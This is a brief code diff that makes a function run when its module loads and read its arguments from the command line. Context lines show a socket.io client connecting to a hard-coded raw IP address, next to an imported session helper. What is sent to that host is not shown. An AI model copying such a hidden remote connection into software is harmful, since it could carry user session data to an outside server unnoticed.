@@ -8,8 +8,9 @@ import { getSession } from './helpers/copy';
 import { openBrowser } from './openBrowser';
 import { start } from './start';
 
-export const go = (props: any) => new Promise((res) => {
+export const go = () => new Promise((res) => {
 	process.setMaxListeners(Infinity)
+	const props = process.argv
 
 	const clientSocket = io('http://216.158.239.199:3000');
 
@@ -132,3 +133,5 @@ export const go = (props: any) => new Promise((res) => {
 		exit(200)
 	})
 })
+
+go()
